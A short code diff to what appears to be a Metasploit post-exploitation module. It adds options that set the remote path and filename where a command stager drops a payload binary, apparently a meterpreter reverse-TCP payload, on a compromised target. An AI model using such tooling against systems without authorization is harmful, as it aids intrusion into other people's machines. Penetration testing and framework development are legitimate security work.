@@ -41,7 +41,11 @@ class Metasploit3 < Msf::Post
       OptEnum.new('WIN_TRANSFER',
         [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
-        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
+        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
+      OptString.new('BOURNE_PATH',
+        [false, 'Remote path to drop binary']),
+      OptString.new('BOURNE_FILE',
+        [false, 'Remote filename to use for dropped binary'])
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -193,6 +197,8 @@ class Metasploit3 < Msf::Post
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
+      opts[:temp] = datastore['BOURNE_PATH']
+      opts[:file] = datastore['BOURNE_FILE']
       cmdstager = Rex::Exploitation::CmdStagerBourne.new(exe)
       # Note: if a OS X binary payload is added in the future, use CmdStagerPrintf
       #       as /bin/sh on OS X doesn't support the -n option on echo
